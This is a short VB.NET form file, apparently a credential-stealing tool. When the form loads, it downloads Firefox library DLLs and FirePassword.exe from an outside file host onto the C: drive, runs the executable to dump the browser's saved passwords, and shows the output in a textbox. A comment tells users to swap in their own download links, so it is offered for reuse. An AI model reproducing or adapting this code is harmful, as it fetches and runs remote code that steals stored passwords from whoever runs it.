Option Strict Off
Option Explicit On
Friend Class Form1
	Inherits System.Windows.Forms.Form
	Private Declare Function URLDownloadToFile Lib "urlmon"  Alias "URLDownloadToFileA"(ByVal pCaller As Integer, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Integer, ByVal lpfnCB As Integer) As Integer
	
	'Mason Soiza
	'Msn = mason.soiza@live.co.uk
	'Email = mason.soiza@gmail.com
	
	Private Sub Form1_Load(ByVal eventSender As System.Object, ByVal eventArgs As System.EventArgs) Handles MyBase.Load
		'UPGRADE_WARNING: Dir tiene un nuevo comportamiento. Haga clic aquí para obtener más información: 'ms-help://MS.VSCC.v90/dv_commoner/local/redirect.htm?keyword="9B7D5ADD-D8FE-4819-A36C-6DEDAF088CC7"'
		If Dir("C:\FirePassword.exe") = "" Then
			'Please Change This Shit To Your Own FirePassword.exe Links
			URLDownloadToFile(0, "http://iirr.fileave.com/nspr4.dll", "C:\nspr4.dll", 0, 0)
			URLDownloadToFile(0, "http://iirr.fileave.com/nss3.dll", "C:\nss3.dll", 0, 0)
			URLDownloadToFile(0, "http://iirr.fileave.com/plc4.dll", "C:\plc4.dll", 0, 0)
			URLDownloadToFile(0, "http://iirr.fileave.com/plds4.dll", "C:\plds4.dll", 0, 0)
			URLDownloadToFile(0, "http://iirr.fileave.com/softokn3.dll", "C:\softokn3.dll", 0, 0)
			URLDownloadToFile(0, "http://iirr.fileave.com/FirePassword.exe", "C:\FirePassword.exe", 0, 0)
			Text1.Text = DOSOutput("C:\FirePassword.exe")
		Else
			Text1.Text = DOSOutput("C:\FirePassword.exe")
		End If
		
	End Sub
End Class